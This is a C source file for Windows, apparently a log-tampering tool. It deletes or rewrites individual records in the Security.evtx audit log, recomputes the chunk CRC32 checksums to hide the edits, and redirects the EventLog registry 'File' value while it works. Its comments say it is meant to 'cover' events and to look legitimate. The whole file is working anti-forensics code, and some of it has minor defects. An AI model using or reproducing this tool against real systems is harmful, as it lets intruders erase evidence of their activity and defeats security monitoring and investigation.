#include <stdio.h>
#include <stdint.h> 
#include <stdlib.h>
#include <Windows.h>
#include <winnt.h>

#pragma warning(disable : 4996)

#define SWITCH_PATH "%SystemRoot%\\System32\\winevt\\Security.evtx"
#define DELETE_OPTION 0
#define MODIFY_OPTION 1
#define CHUNK_MLEN 8
#define EVENT_MLEN 4
#define SIZE_NOT_XML 24
#define REPEATED_SIZE_LEN 4
#define TEMPLATE_VALUES_OFFSET 14
#define CHUNK_HEADER_LENGTH_CS 504

char* CHUNK_MAGIC = "\x45\x6C\x66\x43\x68\x6E\x6B\x00";
char* EVENT_MAGIC = "\x2A\x2A\x00\x00";
char* ELEMENT_MAGIC = "\x41\xff\xff";
char* TEMPLATE_MAGIC = "\x00\x00\x0d\x00\x00\x00";

uint32_t crc32_table[256];


typedef uint64_t QWORD;
typedef struct {
	wchar_t* element;
	wchar_t* attribute;
	wchar_t* name;
	int value_length;
	int name_length;
	int index;
	char type;
}ElementObject;


typedef struct{
	DWORD signature; // for debug basically
	DWORD length; // entire event record size
	QWORD id;
	QWORD timestamp; // convert to FILETIME to use
	unsigned int data_start;
	ElementObject* attributes;
	int attribute_count;
	unsigned char* xml_data;
}EventRecord;


typedef struct {
	unsigned char* chunk_header;
	unsigned char* first_event;
	unsigned int events_offset;
}ChunkCS;


typedef struct {
	EventRecord* all_logs;
	ChunkCS* all_chunks;
	size_t events_count;
	size_t chunks_count;
}EvtxData;



typedef struct {
	char type;
	unsigned char* (*action)();
} CaseAction;


typedef struct {
	QWORD event_id;
	char* target_evtx;
	char* attribute;
	char* new_value;
	int operation;
}Arguments;



// Function to initialize the CRC32 table
void init_crc32_table() {
	uint32_t polynomial = 0xEDB88320;
	for (uint32_t i = 0; i < 256; i++) {
		uint32_t crc = i;
		for (uint32_t j = 0; j < 8; j++) {
			if (crc & 1) {
				crc = (crc >> 1) ^ polynomial;
			}
			else {
				crc = crc >> 1;
			}
		}
		crc32_table[i] = crc;
	}
}


void SwitchEvtx(unsigned char* new_path) {
	HKEY hKey;
	LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security";
	unsigned char* valueName = "File";
	DWORD dataSize = strlen((const char*)new_path) + 1;
	LONG result = RegCreateKeyA(
		HKEY_LOCAL_MACHINE,  // Root key
		subKey,            // Subkey
		&hKey             // Handle to the opened key
	);
	if (result != ERROR_SUCCESS) {
		printf("Error opening or creating key: %ld\n", result);
		return 1;
	}
	result = RegSetValueExA(
		hKey,               // Handle to the opened key
		valueName,          // Value name
		0,                  // Reserved, must be 0
		REG_EXPAND_SZ,          // Value type (DWORD in this case)
		new_path, // Data to be stored
		dataSize     // Size of the data
	);

	if (result != ERROR_SUCCESS) {
		printf("Error setting value: %ld\n", result);
		RegCloseKey(hKey);
		return;
	}

	// Close the registry key
	RegCloseKey(hKey);

	printf("Registry value set successfully.\n");
}

// Function to calculate the CRC32 of a buffer
uint32_t calculate_crc32(unsigned char* buffer, size_t length) {
	uint32_t crc = 0xFFFFFFFF;
	for (size_t i = 0; i < length; i++) {
		uint8_t byte = buffer[i];
		uint32_t lookup_index = (crc ^ byte) & 0xFF;
		crc = (crc >> 8) ^ crc32_table[lookup_index];
	}
	return crc ^ 0xFFFFFFFF;
}


BOOL memmem(const char* buffer, const char* sequence, int size) {
	for (int i = 0; i < size; ++i) {
		if (buffer[i] != sequence[i]) {
			return FALSE; // Bytes don't match
		}
	}
	return TRUE; // All bytes match
}

void clear_input_buffer() {
	int ch;
	while ((ch = getchar()) != '\n' && ch != EOF);
}


unsigned long long convert_to_big_endian(unsigned char* data) {
	// Find the position of the last non-zero byte
	int last_non_zero = 7;
	while (last_non_zero >= 0 && data[last_non_zero] == 0) {
		last_non_zero--;
	}

	// Initialize the big endian value
	unsigned long long big_endian_value = 0;

	// Convert to big endian format
	for (int i = last_non_zero; i >= 0; i--) {
		big_endian_value <<= 8;
		big_endian_value |= data[i];
	}

	// Return the big endian value
	return big_endian_value;
}


unsigned char* handleUNICODE(unsigned char * data, ElementObject element) {
	wprintf(L"%.*ls ", element.value_length / 2, data);
	return data + element.value_length;
}


unsigned char* handleInt32(unsigned char * data, ElementObject element) {
	printf("%u", *(unsigned short*)data);
	return data + element.value_length;
}


unsigned char* handleInt64(unsigned char* data, ElementObject element) {
	printf("%lu", *(unsigned long*)data);
	return data + element.value_length;
}


unsigned char* handleGUID(unsigned char* data, ElementObject element) {
	return data + element.value_length;
}


unsigned char* handleSizeT(unsigned char* data, ElementObject element) {
	printf("%u", *(unsigned short*)data);
	return data + element.value_length;
}


unsigned char* handleFileTime(unsigned char* data, ElementObject element) {
	return data + element.value_length;
}


unsigned char* handleSID(unsigned char* data, ElementObject element) {
	return data + element.value_length;
}


unsigned char* handleHexInt32(unsigned char* data, ElementObject element) {
	printf("%d", *data);
	return data + element.value_length;
}

unsigned char* handleHexInt64(unsigned char* data, ElementObject element) {
	unsigned long long value = convert_to_big_endian(data);
	printf("%llx", value);
	return data + element.value_length;
}


void printValues(unsigned char* values_start, ElementObject* attributes, size_t num_elements) {
	// This function gets a pointer to the start of template values and parses
	// the values corresponding to all the attributes

	// handle each attribute with different functions
	CaseAction actions[] = {
		{'\x01', handleUNICODE},
		{'\x08', handleInt32},
		{'\x0a', handleInt64},
		{'\x0f', handleGUID},
		{'\x10', handleSizeT},
		{'\x11', handleFileTime},
		{'\x13', handleSID},
		{'\x14', handleHexInt32},
		{'\x15', handleHexInt64}
	};

	// go over all attributes and call the function that matches the attribute type
	for (size_t i = 0; i < num_elements; i++) {
		wprintf(L"%ls -> %ls -> %.*ls -> ",
			attributes[i].element, attributes[i].attribute, attributes[i].name_length, attributes[i].name);
		for (size_t j = 0; j < sizeof(actions) / sizeof(actions[0]); j++) {
			if (actions[j].type == attributes[i].type) {
				values_start = actions[j].action(values_start, attributes[i]);
				printf("\n");
				break;
			}
		}
	}
	printf("\n");
}


int findByteSequenceIndex(unsigned char* buffer, size_t bufferSize, unsigned char *byteSequence, size_t sequenceLength) {
	// This function recieves a buffer and a byte sequence with sizes for each.
	// The functions returns the index of the first match in buffer.
	// The byte FF is considered a wildcard in the byte sequence,
	// so any value in buffer can match it.

	for (size_t i = 0; i <= bufferSize - sequenceLength; i++) {
		int found = 1; // Flag to indicate if the byte sequence is found
		for (size_t j = 0; j < sequenceLength; j++) {
			if (byteSequence[j] != 0xFF && buffer[i + j] != byteSequence[j]) {
				found = 0; // Reset the flag if any byte in the sequence doesn't match
				break;
			}
		}
		if (found) {
			return i; // Return the index if the byte sequence is found
		}
	}
	return -1; // Return -1 if the byte sequence is not found
}


void calChecksums(ChunkCS chunk_cs){
	// This function calculates the checksums of all chunks,
	// if the calculated checksum matches the written one,
	// no change was made to any chunk event. otherwise,
	// a change was made so we must update the checksums.

	unsigned char* chunk_cs_header;
	unsigned int my_events_checksum, my_chunk_checksum;
	unsigned int events_checksum, chunk_checksum;

	// make sure the struct pointers are valid
	if (chunk_cs.chunk_header != NULL && chunk_cs.first_event != NULL) {
		chunk_cs_header = malloc(CHUNK_HEADER_LENGTH_CS);
		if (chunk_cs_header == NULL) { 
			return;
		}

		// calculate the chunk events checksum and compare to the existing one.
		my_events_checksum = calculate_crc32(chunk_cs.first_event, chunk_cs.events_offset);

		memcpy(&events_checksum, chunk_cs.chunk_header + 52, sizeof(unsigned int));
		
		if (my_events_checksum != events_checksum) {
			printf("Oh shit i gotta cover your events! %x %x\n", events_checksum, my_events_checksum);
			memcpy(chunk_cs.chunk_header + 52, &my_events_checksum, sizeof(unsigned int));
		}

		// calculate the chunk header checksum and compare to the existing one.
		memcpy(chunk_cs_header, chunk_cs.chunk_header, 120);
		memcpy(chunk_cs_header + 120, chunk_cs.chunk_header + 128, CHUNK_HEADER_LENGTH_CS - 120);
		
		my_chunk_checksum = calculate_crc32(chunk_cs_header, CHUNK_HEADER_LENGTH_CS);
		
		memcpy(&chunk_checksum, chunk_cs.chunk_header + 124, sizeof(unsigned int));
		if (my_chunk_checksum != chunk_checksum) {
			printf("Oh shit i gotta cover your chunk! %x %x\n", chunk_checksum, my_chunk_checksum);
			memcpy(chunk_cs.chunk_header + 124, &my_chunk_checksum, sizeof(unsigned int));
		}
	}
}


void addObjectToArray(void** array, size_t* arraySize, const void* objectToAdd, size_t elementSize){
	void* newObject = malloc(elementSize);
	if (!newObject) {
		perror("Memory allocation failed");
		return;
	}
	// Copy the object data to the new object
	memcpy(newObject, objectToAdd, elementSize);

	// Resize the array to accommodate the new object
	*arraySize += 1;
	*array = realloc(*array, (*arraySize) * elementSize);
	if (!*array) {
		perror("Memory reallocation failed");
		free(newObject);
		return;
	}

	// Add the new object to the array
	memcpy((char*)*array + ((*arraySize - 1) * elementSize), newObject, elementSize);

	// Clean up
	free(newObject);
}


EvtxData parse_evtx(unsigned char* buffer, size_t file_len) {
	char template_type;
	int chunk_event = 0, first_index = 0, chunk_offset = 0;
	int k, counter, temp_offset, current_value_offset, template_index, attribute_offset, xml_size, global_index;
	unsigned int chunk_length, chunk_cs_offset = 0;
	unsigned short value_length;
	unsigned char* match;
	unsigned char* xml_end = NULL;
	unsigned char* first_event = NULL;
	unsigned char* chunk_header = NULL;
	QWORD event_id;
	size_t event_size;
	size_t event_count = 0;
	size_t chunks_size = 0;
	size_t attribute_count = 0;
	size_t prev_attribute_count = 0;
	EventRecord* all_logs = NULL;
	EventRecord current_log;
	ChunkCS* chunk_data = NULL;
	ChunkCS current_chunk;
	ElementObject current_attribute;
	ElementObject* template_attributes = NULL;
	EvtxData data;
	
	// read the entire log file, following the 4 byte alignment
	for (int i = 0; i < file_len; i += 4) {

		// if we land at a chunk start, note its offset in buffer
		if (memmem(&buffer[i], CHUNK_MAGIC, CHUNK_MLEN)) {
			chunk_offset = i;
			chunk_event = 0;

			// copy the contents of the chunk header to calculate the checksum
			memcpy(&chunk_cs_offset, &buffer[i + 48], sizeof(unsigned int));
			current_chunk.chunk_header = &buffer[i];
			continue;
		}

		// check if we land at a record start
		if (memmem(&buffer[i], EVENT_MAGIC, EVENT_MLEN)) {
			global_index = i;
			chunk_event++;
			if (chunk_event == 1) {
				current_chunk.first_event = &buffer[i];
				current_chunk.events_offset = chunk_cs_offset - (i - chunk_offset);
				addObjectToArray((void**)&chunk_data, &chunks_size, &current_chunk, sizeof(ChunkCS));
			}

			// get the size of the entire event
			memcpy(&event_size, &buffer[i + 4], sizeof(event_size));

			// get the event id
			memcpy(&event_id, &buffer[i + 8], sizeof(event_id));

			// calculate the size of the binary xml part of the record
			xml_size = event_size - SIZE_NOT_XML;

			// copy the static content to the struct, everything besided the binary xml data and attributes
			current_log.xml_data = NULL;
			memcpy(&current_log, &buffer[i], sizeof(EventRecord) - (sizeof(char*) + sizeof(ElementObject*) + sizeof(int) +
				sizeof(unsigned char*)));

			// dynamically allocate xml data and copy the binary xml content into it
			current_log.xml_data = malloc(xml_size + 1);
			if (current_log.xml_data == NULL) {
				printf("Can't alloc xml_data.");
				return;
			}
			memcpy(current_log.xml_data, &buffer[i + SIZE_NOT_XML], xml_size - REPEATED_SIZE_LEN);
			global_index += SIZE_NOT_XML;

			// match - just so we dont use ugly &current_log.xml_data[k]
			match = current_log.xml_data;

			// go over the entire binary xml increasing by one byte
			for (k = 0; k < xml_size; k++) {

				// look for every element in the record
				// Element here is Data -> <Data> hey </Data>
				if (memmem(&match[k], ELEMENT_MAGIC, 3) == TRUE) {

					// save the elements name by using a given offset
					memcpy(&temp_offset, &match[k + 7], sizeof(temp_offset));
					current_attribute.element = &buffer[chunk_offset + temp_offset + 8];

					// look for an attribute object - BinXmlTokenAttribute
					// Attribute here is Name -> <Data Name=...>
					attribute_offset = findByteSequenceIndex(&match[k], 50, "\x06\xFF\xFF\xFF\xFF\x05", 6);
					if (attribute_offset != -1 && attribute_offset + k < xml_size) {
						k += attribute_offset;

						// save the attribute name
						memcpy(&temp_offset, &match[k + 1], sizeof(temp_offset));
						current_attribute.attribute = &buffer[chunk_offset + temp_offset + 8];

						// save the attribute value and value length
						// Attribute value here is Tal -> <Data Name="Tal">
						current_attribute.name_length = match[k + 7];
						current_attribute.name = &match[k + 9];

						// save the type of element value and its index in the template
						xml_end = &match[k + 7] + (match[k + 7] * 2);
						template_index = xml_end[4];
						memcpy(&template_type, &xml_end[6], sizeof(template_type));

						current_attribute.type = template_type;
						current_attribute.index = template_index;

						// dynamically increase the size of template_attributes
						addObjectToArray((void**)&template_attributes, &attribute_count, &current_attribute, sizeof(ElementObject));

						// check if were at the last event ( x04 is a closed tag, so 2 of them is end of data)
						if (memmem(&xml_end[7], "\x04\x04", 2) != NULL) {
							global_index += k + 7 + (match[k + 7] * 2);
							counter = 0;
							current_value_offset = TEMPLATE_VALUES_OFFSET;

							prev_attribute_count = attribute_count;

							// go over every template attribute and assign its length in bytes.
							while (counter < attribute_count) {
								memcpy(&value_length, &xml_end[current_value_offset], sizeof(unsigned short));
								template_attributes[counter].value_length = value_length;
								current_value_offset += 4;
								counter++;
							}
							global_index += current_value_offset;
						}
					}
				}
				else if (memmem(&match[k], TEMPLATE_MAGIC, 6) == TRUE) {
					global_index += k;
					counter = 0;
					current_value_offset = 6;
					while (counter < prev_attribute_count) {
						memcpy(&value_length, &match[k + current_value_offset], sizeof(unsigned short));
						template_attributes[counter].value_length = value_length;
						current_value_offset += 4;
						counter++;
					}
					global_index += current_value_offset;
					break;
				}
			}

			// at the end of the xml binary, print the entire data.
			if (global_index != SIZE_NOT_XML + i) {
				current_log.attributes = NULL;
				current_log.attributes = malloc(prev_attribute_count * sizeof(ElementObject));
				if (current_log.attributes == NULL) {
					printf("Can't alloc attributes.");
					return;
				}
				memcpy(current_log.attributes, template_attributes, sizeof(ElementObject) * prev_attribute_count);
				current_log.attribute_count = prev_attribute_count;
				current_log.data_start = global_index;

				addObjectToArray((void**)&all_logs, &event_count, &current_log, sizeof(EventRecord));

			}
			xml_end = NULL;
			attribute_count = 0;

			// this shit is important so we dont read binary xml and parse
			// it as an event. took 4 Hours with another lil bug fix.
			i += event_size - 4;
		}
	}
	memcpy(&data.all_logs, &all_logs, sizeof(EventRecord*));
	memcpy(&data.all_chunks, &chunk_data, sizeof(ChunkCS*));
	memcpy(&data.chunks_count, &chunks_size, sizeof(size_t));
	memcpy(&data.events_count, &event_count, sizeof(size_t));

	return data;
}


void modify_log(unsigned char* buffer, size_t file_len, Arguments args) {
	size_t value_len, attribute_len;
	wchar_t* value_wstr;
	wchar_t *attribute_wstr = NULL;
	int i;
	int value_offset = 0;
	EvtxData data = parse_evtx(buffer, file_len);
	EventRecord* all_logs = data.all_logs;
	ChunkCS* all_chunks = data.all_chunks;

	attribute_len = MultiByteToWideChar(CP_ACP, 0, args.attribute, -1, NULL, 0);
	attribute_wstr = malloc(attribute_len * sizeof(wchar_t));
	attribute_len = MultiByteToWideChar(CP_ACP, 0, args.attribute, -1, attribute_wstr, attribute_len);

	value_len = MultiByteToWideChar(CP_ACP, 0, args.new_value, -1, NULL, 0);
	value_wstr = malloc(value_len * sizeof(wchar_t));
	value_len = MultiByteToWideChar(CP_ACP, 0, args.new_value, -1, value_wstr, value_len);


	for (i = 0; i < data.events_count; i++) {
			
		// check if the user inserted a valid event id
		if (args.event_id == all_logs[i].id) {
			// check if the value exists
			for (int j = 0; j < all_logs[i].attribute_count; j++) {

				if (wcsncmp(attribute_wstr, all_logs[i].attributes[j].name, all_logs[i].attributes[j].name_length) == 0) {
					if (all_logs[i].attributes[j].type != '\x01') {
						printf("Can't modify values that arent unicode, yet!\n");
						exit(1);
					}
					
					// if the new value is longer than the current - future work.
					if (value_len * 2 > all_logs[i].attributes[j].value_length) {
						printf("New value must be shorter or even to the length of the current value!\n");
						exit(1);
					}
					wprintf(L"Changing %.*ls to %.*ls\n",
						all_logs[i].attributes[j].value_length, &buffer[all_logs[i].data_start + value_offset],
						value_len, value_wstr);
					memcpy(&buffer[all_logs[i].data_start + value_offset], value_wstr, (value_len -1) * 2);
					wprintf(L"New Value -> %.*ls\n",
						all_logs[i].attributes[j].value_length, &buffer[all_logs[i].data_start + value_offset]);
					i = data.events_count;
					break;
				}
				value_offset += all_logs[i].attributes[j].value_length;
			}
		}
	}
	free(attribute_wstr);
	free(value_wstr);
	if (i != data.events_count + 1) {
		printf("Event wasn't parsed. maybe in future release!\n");
		exit(1);
	}
	// recalculate checksums
	for (int i = 0; i < data.chunks_count; i++) {
		calChecksums(all_chunks[i]);
	}
}


void delete_log(unsigned char* buffer, size_t file_len, QWORD id) {
	int chunk_event = 0, chunk_offset = 0, chunk_length = 0, chunk_cs_offset = 0;
	unsigned short value_length;
	unsigned int event_size = 0;
	unsigned int combined_sizes = 0;
	unsigned int* prev_size = 0;
	unsigned char* prev_event = NULL;
	unsigned char* chunk_header = NULL;
	size_t chunks_size = 0;
	ChunkCS* chunk_data = NULL;
	ChunkCS current_chunk;
	QWORD event_id;

	// read the entire log file, following the 4 byte alignment
	for (int i = 0; i < file_len; i += 4) {
		
		// if we land at a chunk start, note its offset in buffer
		if (memmem(&buffer[i], CHUNK_MAGIC, CHUNK_MLEN)) {
			chunk_offset = i;
			chunk_event = 0;

			// copy the contents of the chunk header to calculate the checksum
			memcpy(&chunk_cs_offset, &buffer[i + 48], sizeof(unsigned int));
			current_chunk.chunk_header = &buffer[i];

			continue;
		}

		// check if we land at a record start
		if (memmem(&buffer[i], EVENT_MAGIC, EVENT_MLEN)) {
			chunk_event++;

			// get the size of the entire event
			memcpy(&event_size, &buffer[i + 4], sizeof(event_size));

			// get the event id
			memcpy(&event_id, &buffer[i + 8], sizeof(event_id));

			if (chunk_event == 1) {
				current_chunk.first_event = &buffer[i];
				current_chunk.events_offset = chunk_cs_offset - (i - chunk_offset);
				addObjectToArray((void**)&chunk_data, &chunks_size, &current_chunk, sizeof(ChunkCS));
			}

			if (event_id == id) {
				printf("Gotcha!\n");
				memset(&buffer[i], 0, event_size);
				if (prev_event != NULL) {
					combined_sizes = event_size + *prev_size;
					memcpy(&prev_event[4], &combined_sizes, sizeof(unsigned int));
					memcpy(&buffer[i] + event_size - 4, &combined_sizes, sizeof(unsigned int));
				}
				break;
			}

			prev_event = &buffer[i];
			prev_size = &prev_event[4];
			i += event_size - 4;
		}
	}

	// recalculate checksums
	for (int i = 0; i < chunks_size; i++) {
		calChecksums(chunk_data[i]);
	}
}


void displayHelp() {
	printf("Usage: program.exe [options]\n");
	printf("All options have to be used!\n");
	printf("Options:\n");
	printf("  -i <number>   Event ID to work on\n");
	printf("  -t <path>      Target evtx file path\n");
	printf("  -m Modify event (flag), must send -a and -v too.\n");
	printf("  -d Delete event (flag)\n");
	printf("  -h, --help     Display this help message\n");
}


Arguments processArguments(int argc, char* argv[]) {

	// Initialize default values
	BOOL idFlag = FALSE, targetFlag = FALSE, modifyFlag = FALSE, deleteFlag = FALSE,
		attributeFlag = FALSE, valueFlag = FALSE;
	Arguments args;
	char* endptr;

	// Parse command-line arguments
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
			idFlag = TRUE;
			args.event_id = strtoll(argv[i + 1], NULL, 10);
		}
		else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
			targetFlag = TRUE;
			args.target_evtx = argv[i + 1];
		}
		else if (strcmp(argv[i], "-a") == 0 && i + 1 < argc) {
			attributeFlag = TRUE;
			args.attribute = argv[i + 1];
		}
		else if (strcmp(argv[i], "-v") == 0 && i + 1 < argc) {
			valueFlag = TRUE;
			args.new_value = argv[i + 1];
		}
		else if (strcmp(argv[i], "-d") == 0) {
			deleteFlag = TRUE;
			args.operation = DELETE_OPTION;
		}
		else if (strcmp(argv[i], "-m") == 0) {
			modifyFlag = TRUE;
			args.operation = MODIFY_OPTION;
		}
		else if (strcmp(argv[i], "-h") == 0) {
			displayHelp();
			exit(1);
		}
	}
	if (!(idFlag && targetFlag && (modifyFlag || deleteFlag))) {
		printf("You must specify -i, -t and either -m or -d!\n");
		exit(1);
	}
	if (modifyFlag && deleteFlag) {
		printf("Cant specify -m and -d together!\n");
		exit(1);
	}
	if (modifyFlag) {
		if (!(attributeFlag && valueFlag)){
			printf("You must specify -a and -v with -m!\n");
			exit(1);
		}
	}
	return args;
}


int main(int argc, char* argv[]) {
	DWORD bytes_written;
	size_t file_len;
	Arguments args;

	init_crc32_table();

	args = processArguments(argc, argv);

	// The evtx needs to be created by this script, should be named the same as the
	// evtx file (for example Security.evtx) and be saved in a "legit" path.
	// maybe save in winevt and than delete all events so it will look like an empty evtx
	// like the rest of the shit evtx's
	SwitchEvtx(SWITCH_PATH);
	Sleep(1000);

	// open log file
	HANDLE hFile = CreateFileA(args.target_evtx, GENERIC_READ | GENERIC_WRITE, NULL, NULL,
		OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		DWORD dwError = GetLastError(); // Get the error code
		printf("Error opening file. Error code: %lu\n", dwError);
		printf("Can't open file.");
		return -1;
	}

	// allocate a buffer and read the file to it
	GetFileSizeEx(hFile, &file_len);
	unsigned char* buffer = (unsigned char*)malloc(file_len + 1);
	if (!buffer) {
		printf("Can't alloc buffer.");
		return -1;
	}
	int err = ReadFile(hFile, buffer, file_len, NULL, NULL);
	if (!err) {
		printf("Cant write to buffer.");
		return -1;
	}
	
	if (args.operation == MODIFY_OPTION) {
		// combine parse_evtx and modify_log, no more input. all from args.
		modify_log(buffer, file_len, args);
	}
	else if (args.operation == DELETE_OPTION){
		delete_log(buffer, file_len, args.event_id);
	}

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	WriteFile(hFile, buffer, file_len, &bytes_written, NULL);
	CloseHandle(hFile);
	free(buffer);


	SwitchEvtx(args.target_evtx);
 }